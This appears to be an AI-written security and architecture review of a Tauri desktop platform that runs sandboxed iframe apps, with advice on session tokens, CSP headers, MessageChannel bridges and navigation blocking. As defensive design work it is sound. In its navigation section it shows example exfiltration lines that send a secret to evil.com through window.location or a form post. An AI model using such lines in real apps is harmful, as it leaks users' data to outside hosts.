## 1) ARCHITECTURE STRENGTHS

### Clear separation of concerns (shell vs. apps vs. core)
- **Tauri/Rust backend** hosting the “core” and enforcing capabilities is a strong base for an offline-first sovereign system.
- **Shell as a trusted UI** (window manager, prompts, navigation) is a clean “desktop OS” mental model.
- **Apps as untrusted UI** (iframe + postMessage) is a recognizable pattern (similar to extensions / embedded apps / Slack apps), which helps reasoning about permissions and boundaries.

### Custom protocol + local asset serving is the right primitive
- Serving app bundles through a **custom protocol handler** avoids a local HTTP server, reduces open-port exposure, and gives you a single choke point to:
  - enforce **path traversal** protections,
  - add **security headers**,
  - implement **integrity checking** and **signature validation** at read-time.

### Capability/permission framing is directionally correct
- A permission vocabulary like `storage:*`, `identity:*`, `messaging:*` is a good fit for a capability-based core.
- The idea that apps must go through platform APIs (no arbitrary networking) is the right default for sovereignty and data exfiltration resistance.

### SDK direction is good (hooks + simple bridge)
- A React-friendly SDK (`useStore`, `useIdentity`, `useMessaging`) will be familiar and productive.
- Abstracting the transport (postMessage now; potentially MessagePort / structured clone later) is good: developers should code against *capabilities*, not IPC mechanics.

---

## 2) POTENTIAL ISSUES (EDGE CASES / CHALLENGES)

### “iframe sandbox” is not a process boundary in most system WebViews
In Electron/Chromium you can often rely on site isolation + renderer processes. In **Tauri’s system webviews**:
- Multiple iframes typically share the **same renderer process** (implementation varies by OS/webview).
- A single app can:
  - peg the CPU (tight loop),
  - explode memory,
  - trigger GC churn,
  - block the UI thread,
  and degrade the *entire shell*.

**Impact:** “Near-native shell performance” may be undermined by misbehaving apps, even if they’re sandboxed from data.

**Mitigation options:**
- Prefer **separate webviews** per app (best) when feasible.
- If you keep iframes: enforce strict lifecycle controls (suspend/unload), and consider running heavy work in Workers (still same process) or moving some compute to the Rust/WASM runtime (real isolation).

### Dev-mode vs prod-mode constraints will be messy
Your model relies on strong CSP and “no network.” But dev flows (Vite HMR) need network access to localhost and websocket connections.

You’ll need a well-defined **dev sandbox profile** that:
- is explicitly visible in UI (“Developer mode: relaxed sandbox”),
- cannot be enabled silently by apps,
- cannot persist into production builds.

### App navigation needs explicit control
Even if `connect-src 'none'`, an app can still exfiltrate by *navigating*:
- `window.location = "https://evil.com/#" + secret`
- `<form action="https://evil.com" method="POST">…`

Unless you prevent it, **navigation is a data exfil vector** independent of `fetch()`.

You need:
- CSP `navigate-to 'self'` (where supported),
- and/or webview-level **navigation interception** (block non-`postapp:` navigations and `window.open`).

### Storage model ambiguity: platform storage vs browser storage
Apps can always use:
- `IndexedDB`, `localStorage`, Cache API (depending on secure context),
- and store data outside your CRDT/sync.

That may be acceptable, but it creates:
- confusing behavior (“why didn’t this sync?”),
- potential quota abuse,
- migration/backup complexity.

You should decide and document:
- Do you *allow* browser storage for app-private caches?
- Do you disable it (hard)?
- Do you provide quotas and telemetry?

### “App-to-app exports” needs an RPC contract + versioning story
A manifest `exports` section is a good start, but you’ll quickly need:
- semantic versioning / compatibility ranges,
- schema validation (JSON Schema / TS types),
- error taxonomy,
- timeouts, cancellation,
- “target app not installed/not running” semantics,
- permission prompts scoped to *specific target app + specific method*, not just `app:invoke:*`.

---

## 3) SECURITY CONCERNS (GAPS + FIXES)

### A) The biggest gap: backend permission checks are currently forgeable
In the example, the Rust side does:

```rust
state.permissions.check(app_id, "storage:read")?;
```

…but `app_id` is supplied by the **shell frontend** via `invoke`. The backend has **no cryptographic proof** which app originated the request—because the request originates from the *shell webview*, not the app iframe.

If an attacker finds an XSS in the shell, it’s game over anyway; but even without XSS, you want **defense in depth**: the backend should not trust a string parameter as the caller identity.

**Actionable fix: bind app identity with an unforgeable token**
- When the shell launches an app, it requests an **app session token** from Rust: `create_app_session(app_id) -> token`.
- The shell gives the token to that iframe via a one-time handshake.
- Every subsequent app request must include the token.
- Rust validates token → app_id mapping and enforces permissions based on that mapping.

Even better: use **per-window/per-iframe MessagePort** and keep the token out of general postMessage traffic.

### B) postMessage origin + targetOrigin are too permissive (`'*'`)
Both sides use `postMessage(..., '*')`. That is a common footgun.

**Actionable fixes:**
- In the shell: verify **both**:
  - `event.source === iframe.contentWindow`
  - `event.origin === expectedOrigin` (only if you can guarantee stable origins)
- In the app SDK: post only to a pinned origin, not `'*'`.

If origins are unreliable (custom schemes + sandbox can yield `"null"` origins on some platforms), switch to:
- a **MessageChannel** established during handshake, and communicate only via the `MessagePort` (no origin spoofing via global `message` listener).

### C) CSP enforcement as shown is not reliable via iframe attribute
The proposal shows:

```html
<iframe ... csp="default-src 'self'; ...">
```

The `iframe[csp]` attribute exists in specs, but **support across system webviews is inconsistent**. You should assume it does not work everywhere.

**Actionable fix: enforce CSP via response headers** in the protocol handler for *every* HTML response (and ideally all responses):
- `Content-Security-Policy: ...`
- `X-Content-Type-Options: nosniff`
- `Referrer-Policy: no-referrer`
- `Permissions-Policy: ...` (disable camera/mic/geolocation/usb/etc)
- `Cross-Origin-Opener-Policy` / `Cross-Origin-Embedder-Policy` (careful: may break some things, but useful for hard isolation patterns)

### D) Prevent navigation-based exfiltration explicitly
As noted above, block:
- top-level and subframe navigation to non-platform URLs,
- `window.open` / popups unless explicitly allowed.

**Actionable fix:**
- Add CSP directives: `navigate-to 'self'; form-action 'self'; base-uri 'none'`
- Add webview navigation hooks to deny `http(s):` loads from app frames (platform-controlled allowlist).

### E) “allow-same-origin” increases risk; you may not need it
You currently use:
```html
sandbox="allow-scripts allow-same-origin"
```

`allow-same-origin` makes the iframe a “real origin” instead of an opaque origin. It’s useful for `event.origin` checks and for browser storage, but it also gives the app a more normal web power profile.

If you move to **MessagePort + token handshake**, you can consider dropping `allow-same-origin` to force opaque origin and reduce ambient authority. (Test carefully: many libraries assume same-origin APIs.)

### F) Custom protocol must be treated as a secure context
A lot of modern APIs (crypto, some storage, workers behavior) depend on “secure context.” Some webviews treat custom schemes as insecure unless explicitly marked secure.

**Actionable checks:**
- Verify `isSecureContext === true` inside `postapp://...` pages on all target OSes.
- If not, you may need to serve apps from something like `https://app-id.postapp.localhost/` with a local loopback server *or* configure the webview/custom scheme as secure (platform-specific).

### G) Supply chain & updates: signing is mentioned but not specified
“Signed by known developer” is non-trivial. You’ll need:
- developer identity key model (PKI/web-of-trust/ship identity binding),
- signing format (bundle signature + per-file hashes),
- update framework with rollback and transparency log (optional but recommended),
- UI/UX for trust decisions.

Without this, sandboxing helps, but malicious updates are still a major threat.

---

## 4) PERFORMANCE CONSIDERATIONS (LIKELY BOTTLENECKS)

### IPC overhead + serialization copies
Your path is: **App → postMessage → Shell → Tauri invoke → Rust → response обратно**.

Bottlenecks:
- postMessage structured clone copies (especially for large `Vec<u8>`),
- JSON overhead if you aren’t careful,
- double-hop latency for chatty APIs.

**Actionable fixes:**
- Use `ArrayBuffer` + Transferables for large payloads across postMessage (zero-copy semantics in many engines).
- Use a binary envelope (CBOR) end-to-end (you already mention it).
- Add batching primitives to the SDK (`bridge.batch([...])`).

### Subscription/event fanout
Real-time messaging via the shell as a relay can become expensive:
- many subscribers,
- high-frequency events,
- shell doing filtering.

**Actionable fix:**
- Move subscription management to Rust core where possible; push only relevant events to each app session.
- Add backpressure / rate limiting; disconnect apps that can’t keep up.

### Unbounded app resource usage
As noted: iframes aren’t a hard resource boundary.

**Mitigations:**
- “Unload idle apps” is good, but also consider:
  - watchdog timers (detect non-responsive frames),
  - “app CPU abuse” heuristics,
  - explicit user controls (“Force quit app”).

### Asset loading and caching
Custom protocol handler reading from disk per request can be expensive.
**Actionable fixes:**
- implement in-memory cache of hot assets (with size cap),
- precompute and store a content-addressed file index at install time (hash → file path),
- avoid repeated canonicalize calls per request (cache canonical base + validate relative paths safely).

---

## 5) DEVELOPER EXPERIENCE (DX)

### What will feel good
- React + Tailwind + shadcn is familiar and fast.
- A hook-based SDK is approachable.
- Manifest-driven permissions and exports is clear.

### Likely friction points
1. **Debugging inside iframe inside webview**
   - DevTools availability varies by platform.
   - Source maps + HMR inside a sandboxed iframe is often fragile.

2. **Networkless-by-default breaks many libraries**
   - Many common frontend libs assume they can call out to CDNs, analytics, auth endpoints, etc.
   - You’ll need strong guidance and tooling: “no network; use platform APIs.”

3. **Permission prompts can become noisy**
   - `PROMPT_ALWAYS` for common actions (like messaging) can make apps feel unusable.
   - You’ll need “Allow once”, “Allow for this recipient”, “Allow for 10 minutes”, etc. (scoped, time-bounded grants).

4. **API surface stability**
   - Once third-party apps exist, API changes are expensive.
   - You’ll want versioned APIs early (even if crude): `bridge.call('v1/storage:get', ...)`.

**Actionable DX improvements:**
- Provide a local “simulator shell” (pure web) for rapid iteration, plus “real Tauri” integration testing.
- Ship `@post-urbit/sdk` with:
  - request tracing,
  - typed errors,
  - dev overlay showing permissions used, IPC timings, and blocked navigations.

---

## 6) ALTERNATIVE APPROACHES / COMPONENTS TO RECONSIDER

### Alternative A: Separate WebView per app (strongly consider)
Instead of iframes:
- Each app runs in its own webview instance (potentially its own process depending on OS/webview).
- The shell composes windows at the native level (or via multiple webviews embedded).

**Pros:** better isolation, fewer “one bad app freezes all” cases.  
**Cons:** complex window composition; Tauri’s multi-webview embedding maturity depends on version/OS.

### Alternative B: Run apps as WASM components (WASI) + UI as “views”
Given you already have a WASM runtime:
- Apps could be WASM modules with a constrained host API.
- UI could be:
  - HTML rendered by the shell (like “cards/views”), or
  - a web UI but with logic in WASM and strict host calls.

**Pros:** real resource accounting, easier sandboxing.  
**Cons:** harder for mainstream web devs; UI integration complexity.

### Alternative C: Use a local HTTPS origin per app (instead of custom scheme)
Serve apps from `https://{appId}.postapp.localhost/` with a loopback server and strict host routing.

**Pros:** consistent secure context + origin behavior + CSP support.  
**Cons:** you now run a server, manage ports, deal with firewall prompts, and ensure no external binding.

Many platforms do this successfully, but it’s a trade.

---

## 7) MISSING PIECES (CRITICAL)

### Security / platform integrity
- **App bundle format specification** (`.postapp`):
  - manifest,
  - file table with hashes,
  - signature block,
  - optional transparency metadata.
- **Trust model**:
  - how “known developer” keys are discovered, pinned, revoked.
- **Runtime policy**:
  - navigation policy,
  - permissions policy (browser features),
  - per-app quotas (storage size, event rate).

### Platform governance / lifecycle
- App install/update/uninstall flows (including migrations and cleanup of stored data).
- Permission management UI: view/revoke permissions, audit log per app.
- Compatibility/versioning: platform API versions, minimum platform version in manifest.

### Hardening the shell
- Shell CSP + Trusted Types + strict dependency hygiene (because shell compromise == total compromise).
- Handling untrusted app icons/metadata safely (no SVG script, no remote loads).

### Observability
- Structured audit logs (“app X read contacts at time Y”).
- Diagnostics: per-app CPU/memory (as feasible), IPC latency histograms, crash reports.

### Policy for background work
You explicitly list “background apps” as an open question. It’s not optional:
- notifications, sync agents, scheduled tasks will need it.
You’ll need a model (WASM runtime background tasks, or native jobs) with strict capabilities.

---

## 8) IMPLEMENTATION PRIORITIES (RECOMMENDED ORDER)

### Phase 0 (before UI): lock the security invariants
1. **Define the app security model precisely**:
   - what apps can *never* do (network, navigation, filesystem),
   - what the platform guarantees even if an app is malicious.
2. **Decide isolation strategy** (iframes vs separate webviews) based on target OS/webview realities.

### Phase 1: a vertical slice with real enforcement (not mock security)
1. **App bundle + install pipeline**
   - manifest validation, app_id normalization, safe install directory layout.
2. **Custom protocol serving with security headers**
   - CSP via headers, nosniff, referrer policy, permissions policy.
3. **Secure bridge handshake**
   - per-app session token minted by Rust,
   - MessageChannel/MessagePort transport,
   - backend validates token → app_id (no forgeable `app_id` params).
4. **Navigation blocking**
   - CSP directives + webview navigation interception.

### Phase 2: core APIs with quotas + audit
1. **Storage API** (namespaced, quota’d, synced vs cache distinction)
2. **Permission store** (grants, revocation, prompt UX)
3. **Audit log** plumbing (even minimal)

### Phase 3: eventing/messaging and app-to-app RPC
1. Subscriptions with backpressure and rate limits
2. Messaging send/receive
3. App-to-app invocation with:
   - per-method permissions,
   - schema validation,
   - version negotiation.

### Phase 4: DX + ecosystem
1. Dev server + dev-mode sandbox profile
2. Debug tooling / inspector / logs
3. Signing + update framework + repository support
4. Marketplace UI

---

### Highest-impact actionable changes to your current proposal
If you do only a few things now, do these:

1. **Replace `'*'` messaging + global listeners with MessageChannel + handshake.**
2. **Bind app identity with an unforgeable token verified by Rust** (do not trust `app_id` strings).
3. **Enforce CSP + security headers at the protocol handler level**, not via iframe attributes.
4. **Block navigation and form exfiltration** (`navigate-to`, `form-action`, and webview navigation hooks).
5. **Re-evaluate iframe vs separate webview** based on real-world renderer/process isolation in your target environments.

If you want, I can propose a concrete “secure bridge” protocol (handshake steps, message schema, token lifecycle, and Rust + TS skeletons) that fits Tauri’s constraints and works across WKWebView/WebView2/WebKitGTK.
